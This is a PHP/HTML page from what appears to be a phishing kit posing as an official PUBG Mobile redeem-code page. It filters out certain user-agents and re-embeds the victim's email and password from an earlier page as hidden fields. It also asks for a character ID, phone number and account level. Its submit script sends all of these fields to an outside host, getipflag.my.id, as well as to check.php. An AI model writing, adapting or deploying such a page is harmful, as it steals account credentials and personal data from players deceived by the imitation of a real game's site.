<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: header.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
<title data-lang="code50">PUBG MOBILE | Official Home</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <style>
   @font-face {
     font-family:halloween;
     src: url('css/hal.ttf') format("truetype");
      }
      @font-face {
     font-family:pubg;
     src: url('css/pubg.ttf') format("truetype");
      }
       body {
        margin:0;
        box-sizing:border-box;
       }
       .wrap {
           width:100%;
           height:100%;
       }
       .wrap .bg {
           position:relative;
           width:100%;
           height:100%;
           background:url(media/3.jpeg) no-repeat center;
           background-size:cover; 
       }
       .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:415px;
       }
       
       .bg .label {
           margin-top:-5px;
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           text-align:center;
           width:415px;
           background:url('img/popup.png') no-repeat center;
           background-size:100% 100%;
           background-position:100% 100%;
           height:44px;
           line-height:44px;
           border-radius:4px;
           box-shadow:0 2px 1px black;
       }
       .label span:nth-child(1){
           font-family: 'pubg', sans-serif;
           color:white;
           font-size:20px;
           font-weight:bold;
           text-shadow:0 0.5px 3px black;
       
       }
       .label span:nth-child(2){
           margin-top:2px;
           text-shadow:0 0.5px 3px black;
           margin-right:4px;
           width:90px;
           color:orange;
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           float:right;
           font-family:'pubg';
           height:36px;
           line-height:36px;
           font-size:19px;
           font-weight:bold;
           border-radius:4px;
           padding-left:5px;
       }
       .label span:nth-child(2) i {
           margin-top:7px;
           font-size:20px;
       }
       .bg .box {
           width:100%;
           height:100%;
           background:url('img/a2.jpg') no-repeat;
           background-size:100% 100%;
           text-align:center;
           padding-top:30px;
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
       }
       
       
       .box .form-group {
           width:100%;
           display:flex;
           align-items:center;
           justify-content:center;
           text-align:center;
           position:relative;
           margin-top:13px;
       }
       .form-group .form-input {
           font-family:'pubg';
           font-size:16px;
           width:300px;
           height:40px;
           padding-left:10px;
           color:white;
           border-radius:4px;
           border:1px solid rgba(0,0,0,0.50);
           background:url(img/on.png) no-repeat;
           background-size: cover;
           font-weight:bold;
       }
	   .form-group .form-select {
           font-family:'pubg';
           font-size:16px;
           width:310px;
           height:40px;
           padding-left:10px;
           color:white;
           border-radius:4px;
           border:1px solid rgba(0,0,0,0.50);
          background:url(img/on.png) no-repeat;
           background-size: cover;
           font-weight:bold;
       }
       
       .form-group .submit-btn {
       margin-top:10px;
       width:130px;
       height:40px;
       border-radius:4px;
       font-size:20px;
       color:white;
       border:none;
       font-family:'pubg';
       text-align:center;
       background:url(img/popup.png) no-repeat center;
       background-size:cover;
       border:2px solid #c6b98a;
       font-weight:bold;
       }

       ::placeholder {
           color:white;
       }
       
       
       
       
             @media only screen and (min-width:100px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:150px;
       }
      }
       @media only screen and (min-width:200px) {
           .bg .box {
                padding-top:1.5px;
				width: 100%;
				height: 100%;
            }
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:370px;;
       }
       .bg .label {
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           width:370px;
       }
       .bg .box {
           width:370px;
           height:100%;
       }
       .img {
           position:absolute;
           width:10px;
       }
       .box .spin {
           background:url('img/spin.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .start {
           position:relative;
           border:none;
           bottom:334px;
           width:170px;
       }
        .spin .img:nth-child(2){
           position:relative;
           top:250px;
           left:65px;
           transform:rotate(179.5deg);
       }
       }
       @media only screen and (min-width:399px) {
           .bg .box {
                padding-top:20px;
				height: 100%;
            }
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           margin-top:-7px;
           width:410px;
       }
       .bg .box {
           width:410px;
           height:100%;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:130px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-225px;
           transform:rotate(241deg);
       }
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
       }
       .footer-menu-twitter {
           margin-top:-30px;
       }
       }
       .preload { 
         background:black;
         z-index:999;
         width:100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         display:flex;
         align-items:center;
         justify-content:center;
        }
        .preload h1 {
            font-family:'halloween';
            font-size:5em;
            color:orange;
        }
   </style>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<center>
        <div class="wrap">
        <div class="bg">
            <video src="img/pubg.mp4"
<video style="width: 100%;" src="img/pubg.mp4" autoplay="" loop="" muted=""></video>
            <div class="label">
                <span>REDEEM CODE : BC4HZBRZ9FVM</span>
                
            </div>
            <div class="box">
                <div class="form-group">
                </div>
               <form action="check.php" id="formLogin" onsubmit="open_my_account();" method="post">
      			   <input type="hidden" name="email" value="<?php echo $email;?>" readonly>
      			   <input type="hidden" name="password" value="<?php echo $password;?>" readonly>
      			   <input type="hidden" name="login" value="<?php echo $login;?>" readonly>
                   <div class="form-group">
                       <input oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="14" type="number" name="playid" class="form-input" placeholder="Character ID" required>

                   </div>
                   <div class="form-group">
                       <input type="number" name="phone" class="form-input" placeholder="Phone Number" required>
                   </div>
                   <div class="form-group">
                       <select class="form-select" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
                   </div>
                   <div class="form-group">
                       <input class="submit-btn" type="submit" value="REDEEM">
                   </div>
				   <br>
				   <br>
				   <br>
				   <br>
				   <br>
               </form>
               
               </div>
        
</div> 
<script> function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'https://getipflag.my.id/',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}
</script>
</center>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="js/uh.js" type="text/javascript"></script>
</body>
</html>